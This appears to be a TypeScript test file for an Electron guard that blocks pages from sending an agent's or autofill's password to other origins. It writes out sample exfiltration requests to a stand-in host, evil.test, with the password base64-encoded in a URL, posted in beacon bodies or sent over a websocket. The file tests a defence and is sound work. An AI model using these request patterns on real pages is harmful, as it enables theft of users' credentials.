// @effect-diagnostics nodeBuiltinImport:off - Stands in for an Electron session and page.
import { afterEach, describe, expect, it, vi } from "@effect/vitest";
import type * as Electron from "electron";
import * as NodeEvents from "node:events";

import { guardPasswordSubmission } from "./CredentialNetworkGuard.ts";

type Listener = (
  details: Partial<Electron.OnBeforeRequestListenerDetails>,
  callback: (response: Electron.CallbackResponse) => void,
) => void;

let nextId = 1;

/** A page in its own session; `request` asks the installed guard about one request. */
const fakePage = () => {
  let listener: Listener | undefined;
  const session = {
    webRequest: {
      onBeforeRequest: (handler: Listener) => {
        listener = handler;
      },
    },
  };
  const events = new NodeEvents.EventEmitter();
  const guest = Object.assign(events, { id: nextId++, session });
  const request = (details: Partial<Electron.OnBeforeRequestListenerDetails>) => {
    let cancelled: boolean | undefined;
    listener?.({ webContentsId: guest.id, ...details }, (response) => {
      cancelled = response.cancel === true;
    });
    return cancelled;
  };
  return { guest: guest as unknown as Electron.WebContents, events, request };
};

const body = (text: string) => [{ bytes: Buffer.from(text) }] as Array<Electron.UploadData>;

afterEach(() => {
  vi.useRealTimers();
});

describe("guardPasswordSubmission", () => {
  it("lets an agent's sign-in reach only the page's own origin", () => {
    const page = fakePage();
    guardPasswordSubmission({
      guest: page.guest,
      secret: "hunter2 pw",
      pageOrigin: "https://example.com",
      scope: "origin",
    });

    expect(
      page.request({ url: "https://example.com/session", uploadData: body("pw=hunter2+pw") }),
    ).toBe(false);
    // Same site is not enough for an agent's sign-in.
    expect(
      page.request({ url: "https://login.example.com/", uploadData: body("pw=hunter2%20pw") }),
    ).toBe(true);
    expect(page.request({ url: `https://evil.test/c?d=${btoa("hunter2 pw")}` })).toBe(true);
    expect(
      page.request({ url: "https://evil.test/beacon", uploadData: body('{"p":"hunter2 pw"}') }),
    ).toBe(true);
    // Third-party requests that do not carry the password still load.
    expect(page.request({ url: "https://cdn.test/app.js" })).toBe(false);
    // A body that cannot be read cannot be cleared.
    expect(
      page.request({
        url: "https://evil.test/upload",
        uploadData: [{ blobUUID: "blob-1" }] as Array<Electron.UploadData>,
      }),
    ).toBe(true);
  });

  it("lets a person's autofill reach the same site but not another one", () => {
    const page = fakePage();
    guardPasswordSubmission({
      guest: page.guest,
      secret: "s3cret",
      pageOrigin: "https://www.example.co.uk",
      scope: "site",
    });

    expect(page.request({ url: "https://login.example.co.uk/", uploadData: body("s3cret") })).toBe(
      false,
    );
    expect(page.request({ url: "https://other.co.uk/", uploadData: body("s3cret") })).toBe(true);
    expect(page.request({ url: "http://www.example.co.uk/", uploadData: body("s3cret") })).toBe(
      true,
    );
  });

  it("covers requests fired while the page unloads, then lets the next document be", () => {
    vi.useFakeTimers();
    const page = fakePage();
    guardPasswordSubmission({
      guest: page.guest,
      secret: "s3cret",
      pageOrigin: "https://example.com",
      scope: "origin",
    });

    page.events.emit("did-navigate");
    vi.advanceTimersByTime(5_000);
    expect(page.request({ url: "https://evil.test/", uploadData: body("s3cret") })).toBe(true);
    vi.advanceTimersByTime(10_000);
    expect(page.request({ url: "https://evil.test/", uploadData: body("s3cret") })).toBe(false);
  });

  it("lets nothing with data leave for another origin right after an agent's sign-in", () => {
    vi.useFakeTimers();
    const page = fakePage();
    guardPasswordSubmission({
      guest: page.guest,
      secret: "s3cret",
      pageOrigin: "https://example.com",
      scope: "origin",
    });

    // A script could scramble the password; any data bound elsewhere is refused.
    expect(page.request({ url: "https://evil.test/p?x=dGVyY3Nz" })).toBe(true);
    expect(page.request({ url: "https://evil.test/p", uploadData: body("tercss") })).toBe(true);
    expect(page.request({ url: "wss://evil.test/socket" })).toBe(true);
    expect(page.request({ url: "https://cdn.test/logo.png" })).toBe(false);
    expect(page.request({ url: "https://example.com/api?x=1", uploadData: body("{}") })).toBe(
      false,
    );

    vi.advanceTimersByTime(121_000);
    expect(page.request({ url: "https://evil.test/p?x=dGVyY3Nz" })).toBe(false);
    expect(page.request({ url: "https://evil.test/p", uploadData: body("s3cret") })).toBe(true);
  });
});
